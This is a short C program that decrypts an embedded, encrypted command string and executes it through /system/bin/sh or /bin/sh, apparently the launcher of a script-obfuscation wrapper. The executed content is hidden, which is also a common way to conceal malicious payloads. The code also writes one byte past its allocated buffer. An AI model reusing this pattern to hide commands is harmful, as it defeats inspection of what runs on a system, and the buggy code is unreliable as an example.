
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stdint.h>

#include "common.h"
#include "text.h"




int main(int argc,char **argv)
{



	decryptData(text,sizeof(text));

	if(access("/system/bin/sh",F_OK)==0)
	{
		char  *cmd=malloc(sizeof(text)+1);
		if(cmd==NULL)
		{
			perror("malloc:\n");
			return  -2;
		}
		memcpy(cmd,text,sizeof(text));
		cmd[sizeof(text)+1]=0;
		
		char *arg[]={"/system/bin/sh","-c",NULL,0,0,0,0};
		arg[2]=cmd;
		//printf("text:%s\n\n",cmd);

		execvp("/system/bin/sh",arg);
		
	}
	else if(access("/bin/sh",F_OK)==0)
	{
		char *arg[]={"/bin/sh","-c",NULL,0,0,0,0};
		arg[2]=text;
		

		execvp("/bin/sh",arg);
	}
	else
	{
		printf("Error:  not support\n");
		return  -1;
	}
     
}

